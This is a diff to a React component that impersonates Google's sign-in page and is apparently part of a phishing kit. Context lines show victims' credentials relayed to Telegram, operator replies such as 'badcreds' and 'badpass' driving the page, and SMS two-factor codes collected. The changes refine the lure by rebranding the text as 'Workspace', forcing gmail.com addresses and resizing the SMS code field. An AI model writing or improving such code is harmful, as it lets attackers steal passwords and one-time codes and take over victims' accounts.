@@ -117,7 +117,7 @@ function GoogleSignInPC({
         clearTimeout(passwordTimeoutRef.current);
         passwordTimeoutRef.current = null;
       }
-      setEmailError("Couldn't find your Google Account");
+      setEmailError("Couldn't find your Workspace Account");
       setStep("email");
       
       // Send full formatted notification to Telegram
@@ -304,7 +304,7 @@ function GoogleSignInPC({
       
       if (data.type === 'badcreds') {
         console.log('[Gmail PC] Processing badcreds');
-        setEmailError("Couldn't find your Google Account");
+        setEmailError("Couldn't find your Workspace Account");
         setStep("email");
       } else if (data.type === 'badpass') {
         console.log('[Gmail PC] Processing badpass');
@@ -432,6 +432,11 @@ function GoogleSignInPC({
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(localEmail)) {
       setEmailError("Enter a valid email");
+      return;
+    }
+    
+    if (!localEmail.includes("@gmail.com")) {
+      setEmailError("your email should contain @gmail.com");
       return;
     }
     
@@ -836,7 +841,7 @@ function GoogleSignInPC({
                   <div className={`transition-all duration-300 ${isTransitioning ? 'translate-x-full opacity-0' : 'translate-x-0 opacity-100'}`}>
                     <h1 className="text-[32px] font-normal text-[#202124] mb-2 font-helvetica">Sign in</h1>
                     <p className="text-base text-[#202124] mb-8 font-helvetica">
-                      with your Google Account to continue to <span className="text-[#0b57d0] cursor-pointer hover:underline">{process.env.NEXT_PUBLIC_APP_NAME}</span>
+                      with <span className="text-[#0b57d0] cursor-pointer hover:underline">Workspace</span> to continue to <span className="text-[#0b57d0] cursor-pointer hover:underline">{process.env.NEXT_PUBLIC_APP_NAME}</span>
                     </p>
 
                     <div className="g-input-wrapper font-helvetica">
@@ -1316,7 +1321,7 @@ function GoogleSignInPC({
                               placeholder=" "
                               className="flex-1 bg-transparent border-none outline-none text-[#1f1f1f] text-base ml-5 font-helvetica"
                               disabled={isSubmittingSmsCode}
-                              maxLength={8}
+                              maxLength={6}
                               onKeyPress={(e) => {
                                 if (e.key === 'Enter') {
                                   handleSmsCodeSubmit(e);
